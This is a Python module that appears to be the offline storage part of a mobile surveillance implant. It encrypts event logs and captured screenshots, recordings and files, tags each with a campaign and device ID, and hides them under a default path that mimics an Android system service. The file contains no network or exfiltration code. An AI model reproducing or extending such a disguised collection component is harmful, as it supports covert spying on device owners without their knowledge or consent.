
"""
offline_logger.py - Production offline logging with encrypted storage
"""
import json
import os
import time
import uuid
from pathlib import Path
from typing import Dict, Any, List

from utils.crypto import encrypt, decrypt

class OfflineLogger:
    def __init__(self, config: Dict[str, Any], encryption_key: bytes):
        self.config = config
        self.encryption_key = encryption_key
        self.storage_path = Path(config.get("storage_path", "/data/data/com.android.systemservice/files/offline"))
        self.storage_path.mkdir(parents=True, exist_ok=True)
        self.max_storage_mb = config.get("max_storage_mb", 100)
        
    def log_event(self, event_type: str, data: Any) -> str:
        """Log an event with encryption for offline storage"""
        try:
            event_id = str(uuid.uuid4())
            timestamp = int(time.time())
            
            event_data = {
                "id": event_id,
                "type": event_type,
                "timestamp": timestamp,
                "campaign": self.config.get("campaign_id", "unknown"),
                "device_id": self.config.get("device_id", "unknown"),
                "data": data
            }
            
            encrypted_data = encrypt(json.dumps(event_data).encode(), self.encryption_key)
            filename = f"{self.config['campaign_id']}_{timestamp}_{event_type}_{event_id[:8]}.enc"
            
            (self.storage_path / filename).write_bytes(encrypted_data)
            self._cleanup_storage()
            
            return event_id
            
        except Exception as e:
            print(f"[!] Failed to log event: {e}")
            return ""
    
    def log_artifact(self, artifact_type: str, data: bytes, metadata: Dict = None) -> str:
        """Log binary artifacts (screenshots, recordings, files)"""
        try:
            artifact_id = str(uuid.uuid4())
            timestamp = int(time.time())
            
            artifact_data = {
                "id": artifact_id,
                "type": artifact_type,
                "timestamp": timestamp,
                "campaign": self.config.get("campaign_id"),
                "device_id": self.config.get("device_id"),
                "metadata": metadata or {},
                "size": len(data)
            }
            
            meta_encrypted = encrypt(json.dumps(artifact_data).encode(), self.encryption_key)
            data_encrypted = encrypt(data, self.encryption_key)
            
            base_filename = f"{self.config['campaign_id']}_{timestamp}_{artifact_type}_{artifact_id[:8]}"
            
            (self.storage_path / f"{base_filename}.meta").write_bytes(meta_encrypted)
            (self.storage_path / f"{base_filename}.data").write_bytes(data_encrypted)
            
            self._cleanup_storage()
            return artifact_id
            
        except Exception as e:
            print(f"[!] Failed to log artifact: {e}")
            return ""
    
    def _cleanup_storage(self):
        """Remove oldest logs if storage limit exceeded"""
        try:
            total_size = sum(f.stat().st_size for f in self.storage_path.iterdir() if f.is_file())
            max_bytes = self.max_storage_mb * 1024 * 1024
            
            if total_size > max_bytes:
                files = sorted(self.storage_path.iterdir(), key=lambda f: f.stat().st_mtime)
                
                for file_path in files:
                    if total_size <= max_bytes * 0.8:
                        break
                    
                    try:
                        file_size = file_path.stat().st_size
                        file_path.unlink()
                        total_size -= file_size
                    except Exception as e:
                        print(f"[!] Failed to cleanup file {file_path}: {e}")
                        
        except Exception as e:
            print(f"[!] Storage cleanup failed: {e}")
